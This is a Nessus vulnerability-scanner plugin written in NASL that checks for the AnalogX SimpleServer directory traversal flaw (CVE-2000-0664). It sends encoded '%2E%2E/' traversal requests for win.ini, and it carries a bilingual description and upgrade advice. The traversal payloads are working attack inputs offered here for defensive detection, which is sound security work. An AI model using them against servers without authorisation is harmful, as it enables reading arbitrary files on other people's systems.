#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10489);
 script_version ("$Revision: 1.10 $");
 script_bugtraq_id(1508);
 script_cve_id("CVE-2000-0664");
 
 name["english"] = "AnalogX web server traversal";
 name["francais"] = "Analogx Web server traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to read arbitrary files on
the remote server by prepending %2E%2E/%2E%2E/
in front of the file name sent as a URL string to the 
remote web server.

Solution : If you are using AnalogX SimpleServer:www, 
upgrade to the latest version. If you are using another web 
server, contact your vendor for a patch.

Risk factor : High";

 desc["francais"] = "Il est possible de lire
n'importe quel fichier sur la machine distante
en ajoutant %2E%2E/%2E%2E devant leur nom.


Solution : Si vous utilisez le SimpleServer:www d'AnalogX,
alors mettez-le à jour en version 1.07. Sinon contactez
votre vendeur et demandez un patch
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "%2E%2E/%2E%2E/file.txt";
 summary["francais"] = "%2E%2E/%2E%2E/file.txt";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;

if(! get_port_state(port)) exit(0);

req1 = http_get(item:"%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini", port:port);
req2 = http_get(item:"%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/winnt/win.ini", port:port);

if (check_win_dir_trav(port: port, url: req1, quickcheck: 0))
{
  security_hole(port);
  exit(0);
}

if (check_win_dir_trav(port: port, url: req2, quickcheck: 0))
{
  security_hole(port);
  exit(0);
}

